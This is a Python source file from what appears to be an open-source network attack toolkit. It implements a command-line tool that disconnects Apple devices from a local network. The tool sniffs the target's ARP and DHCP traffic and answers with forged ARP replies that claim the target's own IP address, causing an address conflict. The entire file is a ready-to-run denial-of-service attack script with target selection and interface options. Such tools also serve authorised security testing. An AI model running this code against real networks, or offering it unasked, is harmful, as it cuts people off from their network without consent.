#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
apple_arp_dos.py: Disconnect Apple device in local network with ARP packets (apple_arp_dos)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.network import RawARP, RawSniff, RawSend
from raw_packet.Utils.tm import ThreadManager
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from time import sleep
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'Disconnect Apple device in local network with ARP packets (apple_arp_dos)'
# endregion


# region class AppleArpDos
class AppleArpDos:

    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    _utils: Utils = Utils()
    _arp: RawARP = RawARP()
    _sniff: RawSniff = RawSniff()
    _thread_manager: ThreadManager = ThreadManager(2)

    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None}
    _target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None}
    _quit: bool = False
    # endregion

    # region Init
    def __init__(self, network_interface: str) -> None:
        """
        Init
        :param network_interface: Network interface name
        """
        self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                       required_parameters=['mac-address',
                                                                            'ipv4-address',
                                                                            'first-ipv4-address',
                                                                            'last-ipv4-address'])
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion

    # region Start ARP DOS Apple device
    def start(self,
              target_ip_address: Union[None, str] = None,
              target_mac_address: Union[None, str] = None,
              quit: bool = False) -> None:
        """
        Start ARP DOS Apple device
        :param target_ip_address:
        :param target_mac_address:
        :param quit: Quit mode
        :return: None
        """
        try:

            # region Set variables
            self._quit = quit
            # endregion

            # region Set target
            self._target = self._utils.set_ipv4_target(network_interface=self._your['network-interface'],
                                                       target_ipv4_address=target_ip_address,
                                                       target_mac_address=target_mac_address,
                                                       target_vendor='apple',
                                                       exclude_ipv4_addresses=[])
            # endregion

            # region Start _sniffer
            self._thread_manager.add_task(self._sniffer)
            # endregion

            # region Send first Multicast ARP request packets
            sleep(3)
            if not self._quit:
                self._base.print_warning('Send initial ARP requests')
            self._send_arp_requests(count_of_packets=10)
            # endregion

            # region Wait for completion
            self._thread_manager.wait_for_completion()
            # endregion

        except AssertionError as Error:
            if not self._quit:
                self._base.print_error(Error.args[0])
            exit(1)

        except KeyboardInterrupt:
            if not self._quit:
                self._base.print_info('Exit')
            exit(0)
    # endregion

    # region ARP request sender
    def _send_arp_requests(self, count_of_packets: int = 5) -> None:
        random_ip_address: str = self._base.get_random_ip_on_interface(self._your['network-interface'])
        arp_init_request = self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
                                                  ethernet_dst_mac=self._target['mac-address'],
                                                  sender_mac=self._your['mac-address'],
                                                  sender_ip=self._target['ipv4-address'],
                                                  target_mac='00:00:00:00:00:00',
                                                  target_ip=random_ip_address)
        self._raw_send.send(packet=arp_init_request, count=count_of_packets, delay=0.5)
    # endregion

    # region ARP reply sender
    def _send_arp_reply(self) -> None:
        arp_reply = self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                            ethernet_dst_mac=self._target['mac-address'],
                                            sender_mac=self._your['mac-address'],
                                            sender_ip=self._target['ipv4-address'],
                                            target_mac=self._target['mac-address'],
                                            target_ip=self._target['ipv4-address'])
        self._raw_send.send(packet=arp_reply)
        if not self._quit:
            self._base.print_info('ARP response to: ', self._target['ipv4-address'],
                                  ' "' + self._target['ipv4-address'] +
                                  ' is at ' + self._your['mac-address'] + '"')
    # endregion

    # region Analyze packet
    def _analyze(self, packet: Dict) -> None:

        # region ARP packet
        if 'ARP' in packet.keys():
            if packet['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                    packet['ARP']['target-mac'] == '00:00:00:00:00:00' and \
                    packet['ARP']['sender-mac'] == self._target['mac-address'] and \
                    packet['ARP']['target-ip'] == self._target['ipv4-address'] and \
                    packet['ARP']['sender-ip'] == self._target['ipv4-address']:
                if not self._quit:
                    self._base.print_info('ARP Announcement for: ',
                                          packet['ARP']['target-ip'] + ' (' +
                                          packet['ARP']['sender-ip'] + ')')
                self._send_arp_reply()
        # endregion

        # region DHCPv4 packet
        else:
            if 'DHCPv4' in packet.keys():
                if packet['DHCPv4'][53] == 4:
                    self._base.print_success('DHCPv4 Decline from: ', packet['Ethernet']['source'],
                                             ' IPv4 address conflict detection!')
                if packet['DHCPv4'][53] == 3:
                    if 50 in packet['DHCPv4'].keys():
                        self._target['ipv4-address'] = str(packet['DHCPv4'][50])
                        self._send_arp_requests(count_of_packets=10)
                        if not self._quit:
                            self._base.print_success('DHCPv4 Request from: ', self._target['mac-address'],
                                                     ' requested ip: ', self._target['ipv4-address'])
        # endregion
    # endregion

    # region Sniff ARP and DHCP request from target
    def _sniffer(self) -> None:
        self._sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=self._analyze,
                          filters={'Ethernet': {'source': self._target['mac-address']},
                                   'ARP': {'opcode': 1},
                                   'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
                                   'UDP': {'source-port': 68, 'destination-port': 67}},
                          network_interface=self._your['network-interface'],
                          scapy_filter='arp or (udp and (port 67 or 68))',
                          scapy_lfilter=lambda eth: eth.src == self._target['mac-address'])
    # endregion

# endregion


# region Main function
def main():

    # region Init Raw-packet Base class
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    script_description: str = \
        base.get_banner() + '\n' + \
        ' ' * (int((55 - len(__script_name__)) / 2)) + \
        base.info_text(__script_name__) + '\n\n'
    parser = ArgumentParser(description=script_description, formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', type=str, help='Set interface name for send ARP packets', default=None)
    parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
    parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
    parser.add_argument('-q', '--quit', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner
    if not args.quit:
        base.print_banner()
    # endregion

    # region Get listen network interface, your IP and MAC address, first and last IP in local network
    message: str = 'Please select a network interface for DoS Apple devices: '
    current_network_interface: str = base.network_interface_selection(interface_name=args.interface,
                                                                      message=message)
    # endregion

    # region Start ARP DOS
    apple_arp_dos: AppleArpDos = AppleArpDos(network_interface=current_network_interface)
    apple_arp_dos.start(target_ip_address=args.target_ip,
                        target_mac_address=args.target_mac,
                        quit=args.quit)
    # endregion

# endregion


# region Call Main function
if __name__ == '__main__':
    main()
# endregion
